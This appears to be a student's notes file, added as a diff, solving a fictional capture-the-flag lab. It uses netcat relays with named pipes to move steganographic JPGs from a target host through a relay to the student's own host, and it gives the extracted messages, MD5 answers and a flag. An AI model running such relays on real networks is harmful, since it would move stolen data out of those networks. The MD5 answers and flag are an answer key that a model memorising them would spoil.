@@ -1,0 +1,130 @@
+
+colecting key intelligence and sensitive data from Donovian Cyberspace, move and redirect all data back to your INTERNET_HOST
+
+
+FLAG = move_your_body_body
+
+
+Task 1 Netcat Relay
+
+
+Objective: You have been provided intel in regards to colecting key intelligence and sensitive data from Donovian Cyberspace, move and redirect all data back to your INTERNET-HOST. A Donovian Insider has stashed important information in the form of JPG images on T2. Each JPG image contains a piece of the message in the form of Steganography. Utilizing Netcat relays, you will use the designated RELAY to transfer the JPG images to your INTERNET-HOST. Once the images are downloaded you will use a command-line tool called steghide to extract the message.
+Utilize the targets T1, T2, and RELAY to develop the following netcat relays for use by Gorgan Cyber Forces. The use of names pipes should be utilized on RELAY:
+The Donovian Insider provided a image called 1steg.jpg on T2 and is trying to connect to RELAY on TCP port 1234 to send the file. Establish a Netcat relay on RELAY to accept this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.
+The Donovian Insider provided a image called 2steg.jpg on T2 and is trying to connect to RELAY on TCP port 4321 to send the file. Establish a Netcat relay on RELAY to accept this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.
+The Donovian Insider provided a image called 3steg.jpg on T2 listening for a connection from RELAY on TCP port 6789. Establish a Netcat relay on RELAY to make this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.
+The Donovian Insider provided a image called 4steg.jpg on T2 listening for a connection from RELAY on TCP port 9876. Establish a Netcat relay on RELAY to make this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.
+Use the syntax: steghide extract -sf [image name] to extract the hidden message. Use password when prompted for a passphrase.
+
+
+Scheme of Maneuver:
+Task 1
+> BLUE_HOST-4 (T2) > BLUE_INT_DMZ_HOST-1 (RELAY) > INTERNET_HOST (T1)
+
+
+Task 2
+> INTERNET_HOST (T1)
+→ T3
+→ T4
+
+Task 3
+> INTERNET_HOST (T1)
+→ T5
+
+
+Target Section:
+
+Task 1
+T1
+Hostname: INTERNET_HOST
+External IP: 10.50.26.79 (ALREADY PROVIDED) Internal IP: 10.10.0.40 (ALREADY PROVIDED) (accessed via FLOAT IP)
+creds: (ALREADY PROVIDED)
+Action: Successfully transfer file data between hosts via Netcat
+
+T2
+Hostname: BLUE_HOST-4
+IP: 172.16.82.115
+creds: (NONE)
+Action: Successfully transfer files from this host using Netcat
+
+RELAY
+Hostname: BLUE_INT_DMZ_HOST-1
+IP: 172.16.40.10
+creds: (ALREADY PROVIDED)
+Action: Successfully transfer file data between hosts via Netcat
+
+T1 = 10.50.26.79    #us
+T2 = 172.16.82.115    #BLUE_HOST-4
+Relay = 172.16.40.10  #BLUE_INT_DMZ_HOST-1
+
+# 1
+T2 > RELAY on TCP port 1234 > T1
+1steg.jpg on T2
+Establish a Netcat relay on RELAY to accept this connection and forward to T1
+Use steghide to deode the message. Perform an MD5SUM on this message.
+
+relay
+nc 10.10.0.40 1111 < mypipe | nc -lvp 1234 > mypipe
+nc -lvp 1111 > 1steg.jpg
+I just invent. Then I wait until man comes around to needing what I have invented
+6abd7feac505f1384e6f98e3d1e8ba95
+
+
+
+
+#2
+T2 > RELAY on TCP port 4321 > T1
+2steg.jpg on T2
+
+
+nc 10.10.0.40 1111 < mypipe | nc -lvp 4321 > mypipe
+nc -lvp 1111 > 2steg.jpg
+
+Computers have lots of memory but no imagination
+024a1256e6f2ac6f08d2ccca2c3ba2a1
+
+
+
+#3
+T2 <TCP 6789 Relay > T1
+3steg.jpg on T2
+
+nc 172.16.82.115 6789 < mypipe | nc 10.50.26.79  1111 > mypipe
+nc -lvp 1111 > 3steg.jpg
+
+Hardware: The parts of a computer system that can be kicked
+6fb3afb3a172f3605551c4ac05168a0c
+
+
+
+#4
+T2 <TCP 9876 Relay > T1
+4steg.jpg on T2
+
+nc 172.16.82.115 9876 < mypipe | nc 10.50.26.79  1111 > mypipe
+nc -lvp 1111 > 4steg.jpg
+
+Technology makes it possible for people to gain control over everything, except over technology
+378ee6771aa1cbd9653479bfc7db819e
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
